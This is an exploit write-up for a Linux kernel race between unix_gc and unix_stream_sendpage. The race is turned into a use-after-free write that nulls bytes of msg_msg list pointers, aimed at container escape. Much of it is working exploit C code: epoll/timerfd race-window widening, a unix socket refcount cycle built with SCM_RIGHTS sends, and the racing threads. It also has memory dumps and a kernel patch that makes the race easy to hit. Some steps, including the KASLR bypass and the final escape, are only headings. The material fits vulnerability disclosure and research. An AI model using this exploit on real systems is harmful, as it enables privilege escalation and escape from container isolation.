# Exploit Tech Overview

The vulnerability is race between unix_gc with unix_stream_sendpage.
Because `unix_stream_sendpage` grab skb without lock. It give unix_gc the chance to conccurent do operation on the sk_receive_queue.
We use timerfd to raise exception handler to extend the race windows, buy more time for unix_gc to free skb and let us cross-cache and spray.
```C
static ssize_t unix_stream_sendpage(struct socket *socket, struct page *page,
				    int offset, size_t size, int flags)
{
	...

	skb = skb_peek_tail(&other->sk_receive_queue); //nolock and peek the tail skb
	if (tail && tail == skb) {
		skb = newskb;
	} else if (!skb || !unix_skb_scm_eq(skb, &scm)) {
		if (newskb) {
			skb = newskb;
		} else {
			tail = skb;
			goto alloc_skb;
		}
	} else if (newskb) {
		/* this is fast path, we don't necessarily need to
		 * call to kfree_skb even though with newskb == NULL
		 * this - does no harm
		 */
		consume_skb(newskb);
		newskb = NULL;
	}
	// timerfd expire to raise exception handler here, at same time unix_gc is doing free the skb we grabed before
	if (skb_append_pagefrags(skb, page, offset, size)) {
		tail = skb;
		goto alloc_skb;
	}
```

Since skb is freed before enter function `skb_append_pagefrags`. We can forge skb's contents to our control data.
Using this vulnerability, we can insert a skb_frag on an arbitrary kernel address by the following calling path 
skb_append_pagefrags -> skb_fill_page_desc_noacc -> __skb_fill_page_desc_noacc.

```C
static inline void __skb_fill_page_desc_noacc(struct skb_shared_info *shinfo,
					      int i, struct page *page,
					      int off, int size)
{
	skb_frag_t *frag = &shinfo->frags[i];

	/*
	 * Propagate page pfmemalloc to the skb if we can. The problem is
	 * that not all callers have unique ownership of the page but rely
	 * on page_is_pfmemalloc doing the right thing(tm).
	 */
	frag->bv_page		  = page;
	frag->bv_offset		  = off;
	skb_frag_size_set(frag, size);
}

```

According to the skb_frag_t struct layout, bv_offset is more controllable and it's value is between 0 to 0xfff.
We are interested when value is 0, because we can use choose to null first few bytes of a kernel address.
In this case, `struct msg_msg` become our target object again.
```C
typedef struct bio_vec skb_frag_t;
struct bio_vec {
        struct page *              bv_page;                                              /*     0     8 */
        unsigned int               bv_len;                                               /*     8     4 */
        unsigned int               bv_offset;                                            /*    12     4 */

        /* size: 16, cachelines: 1, members: 3 */
        /* last cacheline: 16 bytes */
};
```

Let's take a look into msg_msg struct layout and a sample memory layout of msg_msgs

```C
struct msg_msg {
        struct list_head {
                struct list_head * next;                                                 /*     0     8 */
                struct list_head * prev;                                                 /*     8     8 */
        } m_list; /*     0    16 */
        long int                   m_type;                                               /*    16     8 */
        /* typedef size_t -> __kernel_size_t -> __kernel_ulong_t */ long unsigned int          m_ts; /*    24     8 */
        struct msg_msgseg *        next;                                                 /*    32     8 */
        void *                     security;                                             /*    40     8 */

        /* size: 48, cachelines: 1, members: 5 */
        /* last cacheline: 48 bytes */
};
```

```
0xffff8880082e2380:     0xffff888008705080      0xffff888007ebf680 //m_list.next m_list.prev
0xffff8880082e2390:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e23a0:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e23b0:     0x0000000000000408      0x0000000000000000 //data
0xffff8880082e23c0:     0x0000001000000000      0x0000000000000000
0xffff8880082e23d0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23e0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23f0:     0x0000000000000000      0x0000000000000000
0xffff8880082e2400:     0xffff888008705f80      0xffff888007ebf800 //m_list.next m_list.prev
0xffff8880082e2410:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e2420:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e2430:     0x0000000000000412      0x0000000000000000 //data
0xffff8880082e2440:     0x0000001000000000      0x0000000000000000
0xffff8880082e2450:     0x0000000000000000      0x0000000000000000
0xffff8880082e2460:     0x0000000000000000      0x0000000000000000
0xffff8880082e2470:     0x0000000000000000      0x0000000000000000
```

If we choose (0xffff8880082e2400+2-0x10) as our skb_frag_t, after return from function `__skb_fill_page_desc_noacc`, the above memory layout will become as follow
```
0xffff8880082e2380:     0xffff888008705080      0xffff888007ebf680 //m_list.next m_list.prev
0xffff8880082e2390:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e23a0:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e23b0:     0x0000000000000408      0x0000000000000000 //data
0xffff8880082e23c0:     0x0000001000000000      0x0000000000000000
0xffff8880082e23d0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23e0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23f0:     0xea00001223400000      0x000000001000ffff
0xffff8880082e2400:     0xffff888008700000      0xffff888007ebf800 //m_list.next m_list.prev
0xffff8880082e2410:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e2420:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e2430:     0x0000000000000412      0x0000000000000000 //data
0xffff8880082e2440:     0x0000001000000000      0x0000000000000000
0xffff8880082e2450:     0x0000000000000000      0x0000000000000000
0xffff8880082e2460:     0x0000000000000000      0x0000000000000000
0xffff8880082e2470:     0x0000000000000000      0x0000000000000000
```

m_list.next first two byte has been overwrite to null byte and make it point to another msg_msg.
With two msg_msg->m_list.next point to same address, we can use known exploit tech to achieve container escape.


# Exploit Tech Detail

The exploit is consist in the following steps
* EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)
* Prepare timerfd
* Spray large amount msg_msg
* Prepare refcount circle to make unix_gc free skbs
* Race between unix_gc with unix_stream_sendpage
* Test UAF write on msg_msg
* Achieve container escape.

The most unreliable and hard to success is at `Race between unix_gc with unix_stream_sendpage`.
Because lack of the information to set timeout at right place in nanoseconds, we tried value from 200 ~ 4096.
Depend on how lucky we are we might be hit the right place within few minutes or keep fail after half hour.
To trigger vulns more easily, we recommend to patch the following code to linux kernel.

```diff
diff --git a/net/unix/af_unix.c b/net/unix/af_unix.c
index 5b19b6c53..3bdc0aa94 100644
--- a/net/unix/af_unix.c
+++ b/net/unix/af_unix.c
@@ -2347,7 +2347,7 @@ static ssize_t unix_stream_sendpage(struct socket *socket, struct page *page,
                consume_skb(newskb);
                newskb = NULL;
        }
-
+       mdelay(10);
        if (skb_append_pagefrags(skb, page, offset, size)) {
                tail = skb;
                goto alloc_skb;
```


## EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)

## Prepare timerfd
We adopt the exploit tech from `Jann's blog Racing against the clock -- hitting a tiny kernel race window` to extend the race windows
To make race windows larger on kernels without CONFIG_PREEMPT.
* make a timerfd expire in that window (which will run in an interrupt handler - in other words, in hardirq context)
* make sure that the wakeup triggered by the timerfd has to churn through many waitqueue items created by epoll

So function `do_epoll_enqueue` in our exploit code is to do such thing
```C
void do_epoll_enqueue(int fd)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x4; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x100; i++)
			{
				timefds[i] = SYSCHK(dup(fd));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				epfds[i] = SYSCHK(epoll_create(0x1));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				for (int j = 0; j < 0x100; j++)
				{
					// queue as many as possible async waiters at timerfd waitqueue
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP); // stop here for nothing and just keep epoll alive
		}
		// sync to make sure it has queue what we need
		read(cfd[0], buf, 1);
	}
	close(cfd[0]);
	close(cfd[1]);
}
```
## Spray large amount msg_msg

## Prepare refcount circle to make unix_gc free skbs
We need to make unix_gc detect a refcount circle and do garbage collection to clear selected unix_sockets' sk_receive_queue.
Init two pair unix sockets named A, B, C and D. A's unix_peer is B and C's unix_peer is D.
By send C to A to make B's sk_receive_queue hold a refcount of C.
By send B to D to make C's sk_receive_queue hold a refcount of D.
B and C become a refcount circle, and it will clear these sk_receive_queue when trigger unix_gc.

The following code snippet is to do such thing.
```C
			SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, fds));
			A = fds[0];
			B = fds[1];
			SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, fds));
			C = fds[0];
			D = fds[1];

			// Max the socket send/recv buffer, because we need to spray a certain number skb
			// For heap cross cache attack
			size_t val = 0x400000;
			SYSCHK(SYSCHK(setsockopt(D, SOL_SOCKET, SO_SNDBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(A, SOL_SOCKET, SO_SNDBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(B, SOL_SOCKET, SO_RCVBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(C, SOL_SOCKET, SO_RCVBUF, &val, 4)));

			// Spray a lot skb a head for heap feng shui
			*(int *)CMSG_DATA(cmsg) = C;
			for (int i = 0; i < 0x100; i++)
				SYSCHK(sendmsg(D, &msg, 0));

			// Make B's recv buffer hold C, datapipe and signalpipe refcount
			cmsg->cmsg_len = CMSG_LEN(sizeof(int) * 3);
			msg.msg_controllen = cmsg->cmsg_len;
			((int *)CMSG_DATA(cmsg))[0] = signalpipe[1];
			((int *)CMSG_DATA(cmsg))[1] = datapipe[1];
			((int *)CMSG_DATA(cmsg))[2] = C;
			SYSCHK(sendmsg(A, &msg, 0));

			// decrease unnecessary refcount
			close(signalpipe[1]);
			close(datapipe[1]);

			// Make C's recv buffer hold B refcount
			cmsg->cmsg_len = CMSG_LEN(sizeof(int));
			msg.msg_controllen = cmsg->cmsg_len;
			*(int *)CMSG_DATA(cmsg) = B;
			SYSCHK(sendmsg(D, &msg, 0));

			// Spray a lot skb at tail for heap feng shui
			*(int *)CMSG_DATA(cmsg) = C;
			for (int i = 0; i < 0x100; i++)
				SYSCHK(sendmsg(D, &msg, 0));

			// decrease unnecessary refcount
			close(B);
			close(C);
```

## Race between unix_gc with unix_stream_sendpage
Init two threads to race between unix_gc with unix_stream_sendpage.

Function `trigger_unix_stream_sendpage` in our exploit code will setup a timeout in nanosecond and use system call splice to insert a pipe page to unix_socket.
It will call unix_stream_sendpage to reach our vulnerable function.
```C
void *trigger_unix_stream_sendpage(void *x)
{
	set_cpu(0);
	// setup a certain timeout nanosecond
	struct itimerspec new = {.it_value.tv_nsec = timeout};
	// Send signal to trigger_unix_gc_thread
	write(sync_job[1], "H", 1);
	SYSCHK(timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL));
	splice(datapipe[0], 0, A, 0, 0x1000, 0);
	close(datapipe[0]);
	return NULL;
}

```
Function `trigger_unix_gc_thread` in our exploit code will trigger unix_gc by release a unused unix socket.
It will detect our prepared refcount circle and clear these sk_receive_queue.
```C
void *trigger_unix_gc_thread(void *x)
{
	set_cpu(1);
	int s = socket(AF_UNIX, SOCK_STREAM, 0);
	read(sync_job[0], &x, 1);
	// Release a unix socket will trigger unix_gc
	close(s);
	return NULL;
}
```
## Test UAF write on msg_msg
## Achieve container escape.


